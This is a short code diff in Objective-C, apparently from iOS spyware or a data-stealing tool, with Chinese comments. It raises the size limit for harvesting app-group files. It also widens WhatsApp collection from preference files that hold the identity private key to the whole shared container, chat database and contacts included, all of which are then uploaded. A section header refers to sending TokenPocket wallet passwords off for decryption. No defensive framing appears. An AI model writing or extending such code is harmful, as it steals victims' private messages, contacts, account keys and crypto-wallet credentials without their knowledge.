@@ -850,7 +850,7 @@ static NSArray *WalletMemoryTargets(void) {
         NSDictionary *pkg = [WalletFS collectAppGroup:groupId
                                               include:include
                                               exclude:exclude
-                                                limit:12 * 1024 * 1024];
+                                                limit:32 * 1024 * 1024];
         NSArray *files = pkg[@"files"];
         if (!files.count) {
             [self log:[NSString stringWithFormat:@"appgroup empty: %@ (%@)", groupId, pkg[@"error"] ?: @"no files"]];
@@ -890,10 +890,12 @@ static NSArray *WalletMemoryTargets(void) {
 
 /// WhatsApp：AppGroup 里的 Settings/Preferences（cc/jid/identityPrivateKey 都在 plist）
 - (void)collectWhatsApp {
+    // 配置原文是「/」整容器 + Library/Preferences/：
+    // 之前只挑了 Preferences，把 ChatStorage / ContactsV2 / 账号表全丢了 —— 那是错的。
     [self collectAndUploadAppGroup:@"group.net.whatsapp.WhatsApp.shared"
                             bundle:@"group.net.whatsapp.WhatsApp.shared"
-                           include:@[@"Library/Preferences", @".plist", @"Library/Settings"]
-                           exclude:@[@"/Media/", @".jpg", @".mp4", @"/Message/"]];
+                           include:nil
+                           exclude:@[@"/Media/", @"/Stickers/", @".jpg", @".jpeg", @".png", @".mp4", @".webp"]];
 }
 #pragma mark - TokenPocket：把设备端验证过的密码送去解密
 
